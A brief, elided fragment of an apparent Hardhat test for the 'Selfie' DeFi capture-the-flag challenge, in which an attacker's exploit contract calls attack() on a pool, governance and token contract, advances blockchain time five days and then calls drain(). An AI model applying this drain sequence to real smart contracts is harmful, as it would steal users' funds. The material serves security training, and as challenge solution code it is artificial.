...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    await this.exploitContract.connect(attacker).attack(this.pool.address, this.governance.address, this.token.address);
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
    await this.exploitContract.connect(attacker).drain();
  });
